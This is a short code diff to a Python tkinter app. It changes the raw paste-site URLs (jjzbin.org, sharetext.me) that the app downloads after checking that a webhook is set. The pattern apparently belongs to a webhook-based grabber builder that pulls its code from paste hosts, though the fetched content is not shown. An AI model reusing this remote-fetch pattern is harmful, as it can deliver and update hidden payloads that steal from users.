@@ -91,7 +91,7 @@ class main(tk.Tk):
            ctypes.windll.user32.MessageBoxW(None, f'Set a Webhook first', 'Success', 0)
            return
     
-       paste = 'https://jjzbin.org/raw/uvulol'
+       paste = 'https://jjzbin.org/raw/odicek'
        response = requests.get(paste)
 
        if response.status_code == 200:
@@ -121,7 +121,7 @@ class main(tk.Tk):
            ctypes.windll.user32.MessageBoxW(None, f'Set a Webhook first', 'Success', 0)
            return
     
-       paste = 'https://sharetext.me/raw/9mwrhotbv8'
+       paste = 'https://jjzbin.org/raw/axayub'
        response = requests.get(paste)
 
        if response.status_code == 200:
